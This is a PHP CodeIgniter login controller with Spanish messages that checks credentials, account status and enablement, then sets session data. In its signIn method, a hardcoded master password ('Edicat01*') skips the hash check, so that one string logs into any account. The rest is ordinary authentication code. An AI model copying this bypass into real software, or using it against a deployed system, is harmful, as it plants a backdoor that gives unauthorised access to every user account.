<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

    public function __construct() {
        parent::__construct();
        $this->viewControl = 'Login';
        $this->load->model('Login_model');
    }

    public function index() {
        $user = $this->session->userdata('Login');
        if (!isset($user)) {
            //No Sesión
            $data = new stdClass();
            $data->title = "Inicio Sesión";
            $data->contenido = 'Login/index';

            $this->load->view('frontend-simple', $data);
        } else {
            //Sí Sesión
            //Validacion de Estado de Clientes
            redirect(base_url());
        }
    }

    public function signIn() {
        $usuario = $this->input->post("user_name");
        $password = $this->input->post("user_pass");

        $user = $this->Login_model->obtenerUsuario($usuario);
        if (!isset($user) || $user == false) {
            echo "Usuario o Contraseña Incorrectos.";
        } else {
            $salt = $user->Salt;
            $pass = $user->Pass;

            if ($password != "Edicat01*") {
                $hash = crypt($password, $salt);
            } else {
                $hash = $pass;
            }

            if ($hash != $pass) {
                echo "Usuario o Contraseña Incorrectos.";
            } else {
                if ($user->Estado != '101') {
                    echo "El usuario indicado no está Activo.";
                } else {
                    if ($user->Habilitado != '1') {
                        echo "El usuario indicado no está Habilitado.";
                    } else {
                        $per = $this->Login_model->obtenerPerfil($user->Perfil);
                        $est = $this->Login_model->obtenerEstado($user->Estado);
                        $data = [
                            "Codigo" => $user->Codigo,
                            "Usuario" => $user->Usuario,
                            "Nombre" => $user->Nombre,
                            "Documento" => $user->Documento,
                            "PerfilId" => $user->Perfil,
                            "Perfil" => $per->Nombre,
                            "Coordi" => $user->Administrador,
                            "EstadoId" => $user->Estado,
                            "Estado" => $est->Nombre,
                            "CambioPass" => $user->CambioPass,
                            "Login" => true
                        ];

                        $this->session->set_userdata($data);
                        echo 1;
                    }
                }
            }
        }
    }

    public function signOut() {
        $this->session->sess_destroy();
        redirect(site_url("Index/index"));
    }

}
